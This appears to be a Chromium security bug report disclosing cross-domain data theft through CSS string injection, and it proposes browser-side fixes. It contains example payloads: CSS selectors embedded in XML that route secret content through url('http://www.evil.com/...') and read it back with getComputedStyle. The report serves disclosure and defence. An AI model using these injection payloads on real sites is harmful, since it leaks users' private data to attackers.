<title>Issue 9877 -   chromium -    Security: cross domain thefts via CSS string property injection - Project Hosting on Google Code</title> <pre> This bug is kind of annoying. The hope is that something can be done at the  browser level. We really don't want to have to make sweeping changes to  lots of our applications  and generally burden web apps with more web  browser issues.    This affects Chrome  Safari  IE  Opera and FF. But let's keep this bug  Chrome-private whilst we debate what can be done (and protect our customers  first :)    The attack involves cross-domain CSS stylesheet loading. Because the CSS  parser is very lax  it will skip over any amount of preceding and following  junk  in its quest to find a valid selector. Here is an example of a valid  selector:    body { background-image: url('<a href="http://www.evil.com/blah');">http://www.evil.com/blah');</a> }    And here is an example of a valid selector embedded in an XML document  (this is a paraphrase of a real example low-severity attack):    &lt;photo_comment from=&quot;evil&quot;&gt; blah { blah:0 } body { background-image:  url('<a href="http://www.evil.com/&lt;/photo_comment&gt;&lt;photo_comment">http://www.evil.com/&lt;/photo_comment&gt;&lt;photo_comment</a> from=&quot;trusted&quot;  url=&quot;url_with_key_to_hidden_photo&quot;&gt;some secret  comment&lt;/photo_comment&gt;&lt;photo_comment from=&quot;evil&quot;&gt; ');}&lt;/photo_comment&gt;    As you can see  if the attacker can inject a couple of strings into a  trusted response  there is a useful attack here. The data is stolen cross  domain with e.g. window.getComputedStyle(body_element   null).getPropertyValue('background-image');  (Note that the seemingly redundant blah { blah:0 } selector is to resync  the CSS parser to make sure the evil descriptor parses properly).    There are a surprising number of places in our products where an attacker  can do this. It can apply to HTML  XML  JSON  XHTML  etc.    The main common construct that prevents exploitation is newlines.  Obviously  newlines cannot be considered a defense! The exploitable places  in Google include some JSON and XML data APIs that return responses on a  single line. Some of our XHTML / HTML just happens to be emitted this way too.  Regarding JSON and XML  note that it is not currently a security  requirement to escape ' and &quot; (XML values) or ' (JSON values within double  quoted strings). Nor should we make it a requirement.      Regarding how to fix the browser  here are some starting ideas (from an  ise-team brainstorm).    1) When loading cross-domain CSS  engage a stricter parsing mode that stops  on first syntactic (but not sematic of course) errors.    2) Same as 1)  but also only engage when the MIME type is not CSS.    3) Some variant of 1) or 2) but only engage when X-Content-Type-Options:  nosniff is seen (won't help most of the internet).    4) When loading cross-domain CSS  do not send cookies (probably breaks the  internet :-/ )    Please  feel free to cc: additional people who may be able to help. But try  and keep within Google for now.   </pre>